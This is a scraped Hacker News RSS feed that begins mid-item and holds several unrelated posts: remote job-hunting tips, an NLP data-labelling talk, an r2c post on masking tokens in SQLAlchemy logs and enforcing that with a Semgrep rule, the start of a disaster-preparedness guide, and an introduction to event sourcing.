November 11, 2020 | https://remoteworkers.net/blog/5-tips-for-finding-best-remote-jobs | <a href="https://web.archive.org/web/*/https://remoteworkers.net/blog/5-tips-for-finding-best-remote-jobs">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The pandemic has caused an enormous shift in the way the world works. Companies had to adapt, and we see that <strong>remote working</strong> has become a reality for many employees. Many people are now considering if this transition could be a more permanent work situation after the Covid crisis is over and asking: What if I could work remotely forever?</p><p>If you are thinking about taking the plunge, here are the best tips for you to find the best <strong>remote jobs</strong>:</p><h2>1) Is this the Right kind of Job for You?</h2><p><strong>Remote work</strong> is not for everybody, some people thrive in an office environment, and others easily succeed in working remotely. Be honest and ask yourself which one are you. Only you can define if it is a fit for your work and lifestyle.</p><h2>2) Get to know the remote work community</h2><p>Most job sites don’t have a very good “remote work” filter, but that has changed in the past couple of years with more platforms out there advertising exclusively for remote jobs.</p><p>Once you start your search it’s important to understand the differences between fully and partially distributed companies. A fully distributed company is one in which everyone in the company works remotely. Partially distributed companies are any companies with one or more remote workers, also known as “remote-friendly” or “remote-flexible”.&nbsp;</p><p>But why does that matter?</p><p>Most fully distributed companies have solid onboarding systems and ongoing training programs, so you’ll be set up for success. There are also many partially distributed companies that have successfully integrated a remote workforce. Keep that in mind while searching for a position and ask about it in the interview process.</p><h2>3) Know What Remote Employers Are Looking For</h2><p>Trustworthy people that truly love their work are, by far, the most important traits that employers are looking for in a candidate for a remote job position.</p><p>It seems pretty obvious if you consider that they need to trust that each team member will do their job, as well as create high-quality work, all outside an office environment. If you’re not motivated to work, you likely won’t succeed if no one is looking over your shoulder. Show your remote interviewer how much you care about your work;&nbsp; it will definitely resonate with them.</p><h2>4) Tailor your resume for remote job applications.</h2><p>To land an interview, your resume needs to be tailored to remote companies. Consider including the following points to stand out to remote employers:</p><p><strong>List all important tools:</strong> software tools that you are familiar with using are great to mention. Remote companies are very dependent on these tools to assure that the work and communication flows. Some examples: Slack, Google Hangouts, Trello,&nbsp; Zoom, etc.</p><p><strong>Communication:</strong> Remote companies fail because of bad communication, consequently they look to hire amazing communicators. Your resume should talk about your communication skills, and your email communication with hiring managers and recruiters should be impeccable.</p><p><strong>Autonomy:</strong> Any time you worked with low or no supervision is valuable and will be well noticed on your resume.</p><h2>5) Take Timezone and Location into consideration</h2><p>Looking to start <strong>working remotely</strong> for a company that has its team spread around the globe sounds exciting, but pay attention to the working hours and what your working schedule would look like. Some companies offer total flexibility and you only have to consider their time zone in case of a virtual team meeting from time to time.</p><p>This might be very different for other companies, in which your "online presence" will be expected according to the time zone of where the company has its headquarters. It's easy if you live in Portugal, applying for a remote position in a french company.&nbsp; Figuring out a good time for a meeting from Lisbon while the rest of your team is based in Tokyo might be a much more complicated task. Pay attention to these details while searching for the perfect remote job for you.</p><p>The <strong>remote job</strong> application is not harder but indeed a bit different from other traditional office jobs. To stand out from other candidates, it’s imperative that you immerse yourself in the remote community and show passion for your work.</p><h2>Are you ready?</h2><p>Start now looking for your dream remote job at a remote-friendly company looking to hire the best talent, join <a href="https://remoteworkers.net/signup">Remote Workers</a> today!</p></div></div>]]>
            </description>
            <link>https://remoteworkers.net/blog/5-tips-for-finding-best-remote-jobs</link>
            <guid isPermaLink="false">hacker-news-small-sites-25060843</guid>
            <pubDate>Wed, 11 Nov 2020 17:58:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Datasaur (YC W20) CEO Ivan on how to build/label NLP data]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25060816">thread link</a>) | @cl42
<br/>
November 11, 2020 | https://phaseai.com/resources/datasaur-label-build-nlp-datasets | <a href="https://web.archive.org/web/*/https://phaseai.com/resources/datasaur-label-build-nlp-datasets">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
   <div>
     <div>

     <p>&nbsp;

<iframe src="https://player.vimeo.com/video/477875501?title=0&amp;byline=0&amp;portrait=0" width="640" height="360" frameborder="0" allow="autoplay; fullscreen" allowfullscreen=""></iframe>

     </p><h3>Best Practices for NLP Data Collection and Design</h3>
     <p><i>Ivan Lee on November 10, 2020</i>

     </p><p>You can't build NLP-powered products and services without robust, detailed data sets. Unfortunately, building such data sets can be time consuming and expensive; a poorly designed data set will also prevent your models from actually helping users. Ivan Lee is the CEO and founder of <a href="https://datasaur.ai/" target="_blank">Datasaur</a>, which provides an end-to-end solution for labeling data and using it to build and train NLP-powered models and products. He will discuss best practices for data set design and labelling.
     
     </p><p>Datasaur recently raised <a href="https://techcrunch.com/2020/09/29/datasaur-snags-3-9m-investment-to-build-intelligent-machine-learning-labeling-platform/" target="_blank">$3.9M to build their NLP data platform</a>, and the company is part of Y Combinator's Winter 2020 batch.

     </p></div>
   </div>
</div></div>]]>
            </description>
            <link>https://phaseai.com/resources/datasaur-label-build-nlp-datasets</link>
            <guid isPermaLink="false">hacker-news-small-sites-25060816</guid>
            <pubDate>Wed, 11 Nov 2020 17:56:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fixing leaky logs: how to find a bug and ensure it never returns]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25060456">thread link</a>) | @pabloest
<br/>
November 11, 2020 | https://r2c.dev/blog/2020/fixing-leaky-logs-how-to-find-a-bug-and-ensure-it-never-returns/ | <a href="https://web.archive.org/web/*/https://r2c.dev/blog/2020/fixing-leaky-logs-how-to-find-a-bug-and-ensure-it-never-returns/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><blockquote>
<p><strong>TL;DR</strong> I lay out a case for moving security enforcement into the hands
of developers. I show how I and another developer at r2c successfully identified data
leakage in our logs, fixed the issue, and prevented it from happening in the
future. We did this <em>in a matter of hours, without assistance from our AppSec team</em>.</p>
</blockquote>
<h2>Introduction</h2>
<p>As a developer and engineering manager, I’ve become obsessed with finding ways
to rapidly solve security issues across the engineering organization without ever
needing to fully involve our security team.</p>
<p>Why is this important? I see multiple benefits:</p>
<ul>
<li>Fixing security issues is <em>fast</em>. So fast, in fact, that we can solve them in
minutes after identifying them, without security issues languishing for days
or weeks. In previous roles, I've seen internally known security issues lie
open with only obscurity protecting my organization from fallout.</li>
<li>When developers can solve security issues easily themselves, it frees the
security team to focus on “big picture” security. I want security engineers
to be thinking how to choose frameworks, set up tools, help with secure
architecture, and build defense-in-depth—not finding my last XSS mistake.</li>
</ul>
<p>I call this concept “self-service DevSec”.</p>
<p>In the rest of this blog post, I'll walk through a security bug we encountered
during the day-to-day course of regular development work. I'll discuss how we
discovered the issue, and how, within just a few hours, fixed the security
issue, and used Semgrep to prevent the bug from reoccurring.</p>
<p>Here's the story:</p>
<h2>Story</h2>
<p>Last month, I was debugging a Flask web-app authentication workflow with
Clara McCreery, another engineer at r2c. Like many engineers faced with
a confusing debugging problem, one of our first steps was to throw the web-app
into debug logging.</p>
<p>Specifically, we wanted to know what was going on with our database operations,
so we set our ORM (in this case, we use SQLAlchemy) into INFO-level logging with:</p>
<div data-language="py"><pre><code>logging<span>.</span>getLogger<span>(</span><span>"sqlalchemy.engine.base.Engine"</span><span>)</span><span>.</span>setLevel<span>(</span>logging<span>.</span>INFO<span>)</span></code></pre></div>
<p>This configures SQLAlchemy to log all SQL statements, together with passed
parameters. Let's look at some of the output we saw:</p>
<div data-language="shell-session"><pre><code><span>INFO:werkzeug:127.0.0.1 - - [25/Sep/2020 11:50:01] "POST /api/auth/authenticate HTTP/1.1" 200 -
INFO:sqlalchemy.engine.base.Engine:BEGIN (implicit)
INFO:sqlalchemy.engine.base.Engine:SELECT token.id AS token_id, token.token AS token_token, token.name AS token_name
FROM token
WHERE token.token = %(token_1)s
 LIMIT %(param_1)s
</span><span>INFO<span>:</span><span>sqlalchemy.engine.base.Engine:{'token_1': </span></span><span><span>$</span><span>2a<span>$10</span><span>$KVsyW1jjKn</span>.pvkVi3w9Rn.1mwnZFd7F2SFveGDG8flIhbe.MoJH4G, <span>'param_1'</span><span>:</span> <span>1</span><span>}</span></span></span></code></pre></div>
<p>...Uh-oh.</p>
<p>We definitely shouldn’t be logging tokens (even if they're securely hashed).
(In this example the actual token value has been changed to protect
the innocent.)</p>
<h2>Let’s make a plan</h2>
<p>At this point we’ve identified a security issue, and we want to stomp it out
while preserving our ability to inspect logs. Our plan:</p>
<ol>
<li>Mitigate the immediate security issue.</li>
<li>Find a permanent solution to the problem that’s future proof. A permanent
solution means a baked-in change to our systems. Ideally this solution is
automated and seamless across our entire organization.</li>
<li>Add a mechanism to enforce our solution’s use organization-wide.</li>
</ol>
<p>In the rest of this post, I’ll walk you through how we addressed each step.
Notably, we were able to accomplish this entire flow in a couple hours, without
engaging the security team at all.</p>
<h3>1. Mitigation</h3>
<p>Mitigation here was fairly straightforward, as we already knew the root cause
of our problem. We can quickly revert our logging change. Then we can do
a quick audit of our logs to ensure that only development test tokens were
leaked.</p>
<h3>2. The permanent solution</h3>
<p>How do we prevent SQLAlchemy from logging sensitive data?</p>
<p><em>A valiant attempt</em></p>
<p>Step 1 was to read the docs. A quick web search of “sqlalchemy hide parameters
in engine logging” linked us to the SQLAlchemy <a href="https://docs.sqlalchemy.org/en/13/core/engines.html" target="_blank" rel="noopener">Engine
documentation</a>. A detailed
read later, we found the <code>hide_parameters</code> flag, which prevents the logging
framework from emitting <em>any</em> parameters in logs or exceptions.</p>
<p>While this certainly would prevent our security issue, it was too blunt of a hammer
for us: we wanted to know (for example) database IDs, and the like, for debugging.</p>
<p><em>The real solution</em></p>
<p>We then inspected the relevant SQLAlchemy <a href="https://github.com/sqlalchemy/sqlalchemy/tree/master/lib/sqlalchemy" target="_blank" rel="noopener">source
code</a>. The
relevant code is in <code>sqlalchemy/engine/base.py</code>:</p>
<div data-language="py"><pre><code>    <span>if</span> self<span>.</span>_echo<span>:</span>
        self<span>.</span>engine<span>.</span>logger<span>.</span>info<span>(</span>statement<span>)</span>
        <span>if</span> <span>not</span> self<span>.</span>engine<span>.</span>hide_parameters<span>:</span>
            self<span>.</span>engine<span>.</span>logger<span>.</span>info<span>(</span>
                <span>"%r"</span><span>,</span>
                sql_util<span>.</span>_repr_params<span>(</span>
                    parameters<span>,</span> batches<span>=</span><span>10</span><span>,</span> ismulti<span>=</span>context<span>.</span>executemany
                <span>)</span><span>,</span>
            <span>)</span></code></pre></div>
<p><code>sql_util._repr_params</code>, in turn, runs:</p>
<div data-language="py"><pre><code><span>def</span> <span>_repr_params</span><span>(</span>self<span>,</span> params<span>,</span> typ<span>)</span><span>:</span>
    trunc <span>=</span> self<span>.</span>trunc
    <span>if</span> typ <span>is</span> self<span>.</span>_DICT<span>:</span>
        <span>return</span> <span>"{%s}"</span> <span>%</span> <span>(</span>
            <span>", "</span><span>.</span>join<span>(</span>
                <span>"%r: %s"</span> <span>%</span> <span>(</span>key<span>,</span> trunc<span>(</span>value<span>)</span><span>)</span>
                <span>for</span> key<span>,</span> value <span>in</span> params<span>.</span>items<span>(</span><span>)</span>
            <span>)</span>
        <span>)</span>
    <span>.</span><span>.</span><span>.</span></code></pre></div>
<p>Investigating <code>trunc</code>, we found that it converts the parameter value by
truncating the parameter’s <code>repr</code> to a maximum number of characters.</p>
<p>This meant that we should override the <code>repr</code> method of the parameter object to
prevent sensitive logging.</p>
<p>At this point, like good engineers, we took the lazy route: stand on your
peers’ shoulders. I found <a href="https://github.com/sqlalchemy/sqlalchemy/issues/4806" target="_blank" rel="noopener">this GitHub
issue</a>, where <a href="https://techspot.zzzeek.org/" target="_blank" rel="noopener">Mike
Bayer</a> had already posted a nice solution.</p>
<p>Some shameless copying later (and adding some types to make <code>mypy</code> happy), we
had <a href="https://gist.github.com/nbrahms/2fee940f4d87f09ffc3823be5a334cf3" target="_blank" rel="noopener">this
Gist</a>. The
key code is:</p>
<div data-language="py"><pre><code><span>class</span> <span>ObfuscatedString</span><span>(</span>types<span>.</span>TypeDecorator<span>)</span><span>:</span>
    <span>"""
    String column type for use with SQLAlchemy models whose
    content should not appear in logs or exceptions
    """</span>

    impl <span>=</span> types<span>.</span>String

    <span>class</span> <span>Repr</span><span>(</span><span>str</span><span>)</span><span>:</span>
        <span>def</span> <span>__repr__</span><span>(</span>self<span>)</span> <span>-</span><span>&gt;</span> <span>str</span><span>:</span>
            <span>return</span> <span>"********"</span>

    <span>def</span> <span>process_bind_param</span><span>(</span>self<span>,</span> value<span>:</span> Optional<span>[</span><span>str</span><span>]</span><span>,</span> dialect<span>:</span> Any<span>)</span> <span>-</span><span>&gt;</span> Optional<span>[</span>Repr<span>]</span><span>:</span>
        <span>return</span> self<span>.</span>Repr<span>(</span>value<span>)</span> <span>if</span> value <span>else</span> <span>None</span>

    <span>def</span> <span>process_result_value</span><span>(</span>
        self<span>,</span> value<span>:</span> Optional<span>[</span>Repr<span>]</span><span>,</span> dialect<span>:</span> Any
    <span>)</span> <span>-</span><span>&gt;</span> Optional<span>[</span><span>str</span><span>]</span><span>:</span>
        <span>return</span> <span>str</span><span>(</span>value<span>)</span> <span>if</span> value <span>else</span> <span>None</span>


<span>setattr</span><span>(</span>db<span>,</span> <span>"ObfuscatedString"</span><span>,</span> ObfuscatedString<span>)</span></code></pre></div>
<p>What does this code accomplish? It replaces our original <code>str</code> parameters
with a new <code>ObfuscatedString.Repr</code> parameter. When logged (or when emitted
into an exception message), the string is replaced by our <code>********</code>
obfuscation sentinel. Since the parameter is still bound as a raw string (via
<code>impl = types.String</code>), the correct value is still inserted and selected from
the database.</p>
<p>To use this new column type, we set our <code>token</code>’s column type:</p>
<div data-language="py"><pre><code><span>class</span> <span>Token</span><span>(</span>db<span>.</span>Model<span>)</span><span>:</span>
    <span>.</span><span>.</span><span>.</span>
    token <span>=</span> db<span>.</span>Column<span>(</span>db<span>.</span>ObfuscatedString<span>,</span> <span>.</span><span>.</span><span>.</span><span>)</span>
    <span>.</span><span>.</span><span>.</span></code></pre></div>
<p>We then re-enabled INFO logging, and checked that we were properly obfuscating
text:</p>
<div data-language="shell-session"><pre><code><span>INFO:werkzeug:127.0.0.1 - - [25/Sep/2020 13:48:55] "GET /api/agent/deployments/1/policies HTTP/1.1" 200 -
INFO:sqlalchemy.engine.base.Engine:BEGIN (implicit)
INFO:sqlalchemy.engine.base.Engine:SELECT token.id AS token_id, token.token AS token_token, token.name AS token_name
FROM token
WHERE token.token = %(token_1)s
 LIMIT %(param_1)s
INFO:sqlalchemy.engine.base.Engine:{'token_1': ********, 'param_1': 1}</span></code></pre></div>
<p>For completeness, we also validated in our development database console that the
correct values were stored and retrieved.</p>
<p>Great success! 🚢 Ship it.</p>
<h3>3. Enforcement</h3>
<p>It was tempting to rest on our laurels here. We had solved our security issue for
the time being, and we could get back to debugging our original auth issue.</p>
<p>But we wanted to guarantee that <em>we would never see this issue again</em>. How would we do
this?</p>
<p>Here are some ideas that I’m sure we’ve all encountered before:</p>
<ol>
<li>Block all commits to SQLAlchemy models on security review!</li>
<li>Host a yearly security training for all devs, including the pitfalls of
logging sensitive data!</li>
<li>Audit logs weekly!</li>
<li>File an issue with your SAST provider, demanding they add checks to catch
sensitively logged data!</li>
</ol>
<p>If there is a central take-away from this blog post, it is this: these are not
ideal solutions:</p>
<ol>
<li>Blocking commits introduces needless friction into the development
process, slows development velocity, and needlessly distracts the security
team.</li>
<li>Security trainings are an important component to a security program, and
necessary to keep developers aware of evolving security threats, but humans
have fallible memory, and we can forget things we've heard months or even
days in the past.</li>
<li>Regular audits, like blocking commits, introduce a heavy workload on an
almost certainly overloaded security team.</li>
<li>Your SAST provider will certainly welcome your suggestion, but you will be
beholden to their software release cycle, and may not see checks be
available for months; furthermore, if your issue is domain-specific, it may
not even make sense for a check to be implemented within a generalist product.</li>
</ol>
<p>Fortunately, Semgrep gave us a simple solution here: Define an
<em>invariant</em> in your code, and <em>enforce</em> it using a Semgrep scan on every CI
run.</p>
<p>At r2c, we use GitHub Actions to run Semgrep on every merge request. We define
what checks Semgrep should run using <em>a managed policy</em>, a list of rules and
notification settings managed by <a href="https://semgrep.dev/" target="_blank" rel="noopener">semgrep.dev</a>.</p>
<p>To guarantee our code against future issues, I went to
<a href="https://semgrep.dev/editor" target="_blank" rel="noopener">semgrep.dev/editor</a> and wrote <a href="https://semgrep.dev/s/nbrahms:obfuscate-sensitive-string-columns-2" target="_blank" rel="noopener">a quick rule</a>
to detect potential insecurely logged SQLAlchemy columns.</p>
<p>Here's the rule definition in Semgrep's YAML definition language:</p>
<div data-language="yaml"><pre><code><span>rules</span><span>:</span>
<span>-</span> <span>id</span><span>:</span> obfuscate<span>-</span>sensitive<span>-</span>string<span>-</span>columns
  <span>patterns</span><span>:</span>
    <span>-</span> <span>pattern</span><span>:</span> <span>|</span><span>
        $COLUMN = db.Column(db.String, ...)</span>
    <span>-</span> <span>metavariable-regex</span><span>:</span>
        <span>metavariable</span><span>:</span> $COLUMN
        <span>regex</span><span>:</span> <span>'.*(?&lt;![A-Za-z])(token|key|email|secret)(?![A-RT-Za-rt-z]).*'</span>
  <span>message</span><span>:</span> <span>|</span><span>
    '$COLUMN' may expose sensitive information in logs and exceptions. Use
    'db.ObfuscatedString' instead of 'db.String'.</span>
  <span>severity</span><span>:</span> WARNING</code></pre></div>
<p>What does this rule do? Let’s break it down:</p>
<ul>
<li><code>id</code>: We give our rule a concise descriptive ID for easy reference by any developer who
sees it pop up in their editor or CI output.</li>
<li>
<p><code>patterns</code>: This is composed of two parts:</p>
<ul>
<li><code>pattern</code>: This expression tells Semgrep to …</li></ul></li></ul></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://r2c.dev/blog/2020/fixing-leaky-logs-how-to-find-a-bug-and-ensure-it-never-returns/">https://r2c.dev/blog/2020/fixing-leaky-logs-how-to-find-a-bug-and-ensure-it-never-returns/</a></em></p>]]>
            </description>
            <link>https://r2c.dev/blog/2020/fixing-leaky-logs-how-to-find-a-bug-and-ensure-it-never-returns/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25060456</guid>
            <pubDate>Wed, 11 Nov 2020 17:29:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Doomsday prepping – Disaster planning for less crazy folk (2016)]]>
            </title>
            <description>
<![CDATA[
Score 170 | Comments 115 (<a href="https://news.ycombinator.com/item?id=25060418">thread link</a>) | @VBprogrammer
<br/>
November 11, 2020 | https://lcamtuf.coredump.cx/prep/ | <a href="https://web.archive.org/web/*/https://lcamtuf.coredump.cx/prep/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

 

<a name="1"></a>
<h2>1. Introduction <span>[<a href="#1">link</a>]</span></h2>

<p>
The prepper culture begs to be taken with a grain of salt. In a sense, it has
all the makings of a doomsday cult: a tribe of unkempt misfits who hoard gold
bullion, study herbalism, and preach about the imminent collapse of our society.
</p>

<p>
Today, we see such worries as absurd. It's not that life-altering disasters are
rare: every year, we hear about millions of people displaced by wildfires, earthquakes,
hurricanes, or floods. Heck, not a decade goes by without at least one first-class
democracy lapsing into armed conflict or fiscal disarray. But having grown up in a period
of unprecedented prosperity and calm, we take our way of life for granted - and find
it difficult to believe that an episode of bad weather or a currency crisis could
upend our lives for good.
</p>

<p>
I suspect that we dismiss such hazards not only because they seem surreal, but also because
worrying about them makes us feel helpless and lost. What's more, we follow the same instincts
to tune out far more pedestrian and avoidable risks; for example, 
most of us don't plan ahead for losing a job, for dealing with a week-long water outage, or
for surviving the night if our home goes up in smoke.
</p>

<p>
For many, the singular strategy for dealing with such dangers is to pray for the
government to bail us out. But no matter if our elected officials prefer to school us with
passages from
<a href="https://smile.amazon.com/dp/0156334607">Milton
Friedman</a> or from
<a href="https://smile.amazon.com/dp/0486477487" title="I'm sorry... I'm really sorry!">Thomas
Piketty</a>, the hard truth is that no state can provide a robust safety net for all
of life's likely contingencies; in most places, government-run social programs are severely deficient in funding, in
efficiency, and in scope. Large-scale disasters pit us against even worse odds; from New Orleans in 2005 to
Fukushima in 2011, there are countless stories of people left behind due to political dysfunction, poorly
allocated resources, or lost paperwork.
</p>

<p>
And so, the purpose of this guide is to combat the mindset of learned helplessness by
promoting simple, level-headed, personal preparedness techniques that are easy to
implement, don't cost much, and will probably help you cope with whatever life throws your way.
</p>

<p>
Oh, one thing: in contrast to most other docs of its kind, this page an
unadulterated labor of love; there are no affiliate links, paid product placements, or ads anywhere in the guide.
</p>

<a name="2"></a>
<h2>2. Mapping out the unknown <span>[<a href="#2">link</a>]</span></h2>

<p>
Effective preparedness can be simple, but it has to be rooted in an honest and
systematic review of the risks you are likely to face. Plenty of excited newcomers begin
by shopping for ballistic vests and night vision goggles; they would be better
served by grabbing a fire extinguisher, some bottled water, and then putting the rest of
their money in a rainy-day fund.
</p>

<p>
To maintain sanity while trying to enumerate risks, I found that it's best to focus on
broad outcomes instead of trying to track down every single way for things to go south.
Say, it should not matter if you are laid off because of a downsizing, because
your new boss hates you, or because they finally catch you stealing paperclips. The
outcome is the same: you are out of a job and urgently need a way to pay your bills.
</p>

<p>
Another insidious distraction is the desire to immediately figure out how to respond to all the scenarios
we end up dreaming of. Let's save that for later; by prematurely focusing on the second half of the
problem, we may end up glossing over some of the less tractable scenarios - or make
haphazard assumptions that will cloud our judgment in other ways.
</p>

<p>
I also found that to come up with a rational threat model, we need to think of "risk" as a product of
both the probability and the consequences of a given event. By that metric, stubbed toes
and zombie outbreaks are equally uninteresting; one of them has nearly zero significance,
the other, nearly zero odds.
</p>

<p>
What else? Ah, right: the final piece of advice I have is to keep things uncomplicated. There are
popular doomsday predictions that deal with cutting-edge particle physics, god-like computer
hackers, vast government conspiracies, or extraterrestrial messages hidden in pop songs. I suppose
we can't <i>really</i> rule that stuff out, but historical data suggests that there's a lot more
merit in worrying about falling off a ladder or getting hit by a car.
</p>

<p>
All right! With these caveats in mind, let's go over some canonical scenarios that are worth thinking about.
</p>

<a name="2.1"></a>
<h3>2.1. Problem space #1: Small-scale events <span>[<a href="#2.1">link</a>]</span></h3>

<p>
It's always fun to speculate about solar flares and supervolcanoes; it's far more mind-numbing to
seriously evaluate the consequences of backed up sewage or burst water mains. But in reality,
such unglamorous, small-scale incidents are far more likely to disrupt and reshape our
lives.
</p>

<p>
Broadly speaking, disastrous outcomes of such humdrum contingencies can be divided into
several groups:
</p>

<ul>

<li>
<p>
<b>Insolvency.</b>
  If a person over the age of 40 tells you that they have never lost a job, they are
  pretty lucky (or lying). Yet, the risk is seldom taken seriously; many middle-class,
  single-income families would be in deep trouble if it ever took them more than 2-3 months
  to find a new, equally well-paying gig.
</p>

</li><li>
<p>
<b>Disrupted access to water, food, energy, or transportation.</b>
  Substantial and prolonged outages happen everywhere; many of us will experience
  at least one at some point in our lives. A week without electricity may be just
  inconvenient and scary, especially in a high-rise or
  in a seedy neighborhood; but even a single hot day without potable water is really
  bad news.
</p>

</li><li>
<p>
<b>Loss of shelter.</b>
  Every year, there are over 350,000 house fires in the United States. Such accidents
  usually aren't deadly - but if you are unlucky, they can leave you stranded in the middle
  of the night in your PJs, with no documents or credit cards in hand.
</p>

</li><li>
<p>
<b>Unintentional injury.</b>
  Largely preventable and predictable incidents - such as falls, vehicle collisions, and poisonings -
  account for some 40 million ER visits annually. And lest you say people are simply too
  quick to rush to the hospital, said incidents also result in about 100,000 US
  deaths every year.
</p>

</li><li>
<p>
<b>Intentionally inflicted harm.</b>
  Violent crime is essentially <i>normal</i> almost everywhere in the world.
  In the US in the 90s, your lifetime likelihood of victimization was
  estimated to be around 80%; the odds of suffering criminal injury hovered at 40%. More recent
  research is hard to come by - but rest assured, life-threatening encounters remain a very real risk.
</p>

</li><li>
<p>
<b>Debilitating illness or death.</b>
  It's going to get you; maybe next week, maybe in 50 years. We can't really predict the day,
  but we can understand and meaningfully manage the impact it will have on those who depend on us -
  say, our stay-at-home partners or young kids.
</p>

</li></ul>

<p>
All in all, the risks discussed in this section have three defining characteristics: they are relatively
likely to happen; are strikingly easy to mitigate (we'll get into that soon); and tend to be so
unglamorous that they seldom make the cut in any "serious" guide to emergency preparedness.
</p>

<a name="2.2"></a>
<h3>2.2. Problem space #2: Mass calamities <span>[<a href="#2.2">link</a>]</span></h3>

<p>
If an errant backhoe took out the utilities for your block, you would probably head to the
grocery store to pick up bottled water (and use their restrooms, too). But if a
once-in-a-century storm damaged major roads and left half the city without running water, your
options wouldn't be as clear-cut.
</p>


<p>
That's why we have to look at larger-scale emergencies through somewhat different lens, taking into
account their likely magnitude, duration, and the nature of the forces at play. Some of the
plausible scenarios to think about include:
</p>

<ul>

<li>
<p>
<b>Natural disasters.</b>
  Common examples include floods, hurricanes, earthquakes, wildfires, and heatwaves. In some
  regions, such events are very rare; in others, they are almost guaranteed every decade or two.
</p>

</li><li>
<p>
<b>Industrial accidents.</b>
  Many people live in the proximity of heavy industries - say, refineries, freight railroads, or power plants.
  Depending on the type of industrial facilities nearby, you may want to evaluate the potential
  consequences of upwind and upstream explosions or chemical spills.
</p>

</li><li>
<p>
<b>Social unrest.</b>
  Riots are a distinct risk in many urban and suburban areas around the world. When angry mobs
  take it to the streets, widespread arson and violent crime are not unheard of, sometimes going
  on for days or weeks.
</p>

</li><li>
<p>
<b>Economic crises.</b>
  All highly developed countries go through cyclic recessions and periods of high unemployment;
  the US had about ten big ones in the past 100 years alone. Sometimes, such events
  are accompanied by bank runs and collapses of financial institutions; other times,
  they involve hyperinflation, product rationing, and currency controls.
</p>

</li><li>
<p>
<b>Pandemic.</b>
  It's been a while since the highly developed world experienced a devastating outbreak, but it
  may be premature to flat out dismiss the risk. In 1918, an unusual strain of flu managed to kill 75
  million people. Few years later, a mysterious sleeping sickness - probably also of viral origin -
  swept the globe, crippling millions, some for life. We aren't necessarily better prepared
  for similar events today.
</p>

</li><li>
<p>
<b>Terrorism or conventional war.</b>
  We think we would see it coming - but history shows that such events tend to catch nations
  off guard. These phenomena are noteworthy not only because of their immediate death toll,
  which can be relatively low - but because of the far-reaching and long-term socioeconomic
  disruption they can cause.
</p>

</li></ul>

<p>
Most of us will probably not get tangled up in a large-scale disaster of any sort, but it
is only wise to hedge your bets. There are countless examples to demonstrate that such events
happen often and can strike close to home - say:
</p>

<ul>

<li>
<p>
The EU debt crisis, from 2009 onward. A series of events that led to staggering unemployment rates
in Greece, deposit confiscations in Cyprus, and uncertain prospects for the entire
eurozone.
</p></li></ul></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://lcamtuf.coredump.cx/prep/">https://lcamtuf.coredump.cx/prep/</a></em></p>]]>
            </description>
            <link>https://lcamtuf.coredump.cx/prep/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25060418</guid>
            <pubDate>Wed, 11 Nov 2020 17:26:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Event Sourcing and CQRS with Incident – Part 1]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25060270">thread link</a>) | @pedroassumpcao
<br/>
November 11, 2020 | https://pedroassumpcao.ghost.io/event-sourcing-and-cqrs-using-incident-part-1/ | <a href="https://web.archive.org/web/*/https://pedroassumpcao.ghost.io/event-sourcing-and-cqrs-using-incident-part-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">
        <main id="main">
            <div>

                

                
<section>

    <header>
        <span>November 2, 2020</span>
        
            <p>Event Sourcing and CQRS are design patterns that are great for some domains. The Incident library will help implement them without compromising other parts of your application.</p>
    </header>

    <p><img src="https://pedroassumpcao.ghost.io/content/images/2020/11/e227890b80a0c1ca5436721579babc8b.jpg" alt="Using Event Sourcing and CQRS with Incident -  Part 1"></p>

    <div>
        <p>This is the first of a series of posts that I will present on how your application can use <strong>Event Sourcing</strong> and <strong>CQRS</strong> for specific domains with an open-source library that I am developing called <strong><a href="https://github.com/pedroassumpcao/incident">Incident</a></strong>.</p><hr><p>My first contact with Event Sourcing was back in 2016 when I was working for Raise Marketplace and I led a project that the goal was to solve an accounting burden regarding seller payments. As a marketplace, in a nutshell, a buyer pays for something, the company gets a commission and the seller receives the remaining funds. Track the money flow, depending on the options the marketplace offers, can become complex. In that specific case, sellers could opt for combining funds to be paid daily, via different methods such as check, PayPal, ACH, and so on, or decide to request funds one by one. Around all of that, there was a fraud detection process, transfer limits, a different category of sellers, and so on.</p><p>Before Event Sourcing, there was a lack of a cohesive way to track the steps of each fund, from buyer to seller, and all possible scenarios. And when that comes to accounting people, it becomes a nightmare.</p><p>With well-defined commands, events, and logic associated with them, it became more clear the information the Accounting department needed at the time.</p><p>Later on, I had the opportunity to work on other personal projects using Event Sourcing so I decided to build something to help me moving forward, and from that learning came <a href="https://github.com/pedroassumpcao/incident">Incident</a>.</p><h2 id="what-is-event-sourcing">What is Event Sourcing?</h2><p><strong>Event Sourcing</strong> is a design pattern that defines that the state changes of an entity are stored as a sequence of events. Events are the source of truth and immutable, and the current state of any entity is playing all events of the entity in the order they happened.</p><p>If you are new to <strong>Event Sourcing</strong> and <strong>CQRS</strong> I highly recommend watch <a href="https://www.youtube.com/watch?v=JHGkaShoyNs" rel="nofollow">Greg Young's presentation at Code on the Beach 2014</a> before moving forward as my intention with this blog post series is not to present Event Sourcing principles per se and the details but how those principles were used in the implementation.</p><h2 id="what-event-sourcing-is-not">What Event Sourcing is not?</h2><p>One of the misconceptions that I often see is that if you decide to use Event Sourcing you should apply it to your entire system, to all your domains. This is &nbsp;wrong in my opinion, an anti-pattern and you should avoid at all costs as unlikely all your domains will suit.</p><p>Another fact, Event Sourcing is not new, many industries using "Event Sourcing" concepts even not naming the same way. Accounting keeps track of all account operations, your medical record is about your health history, 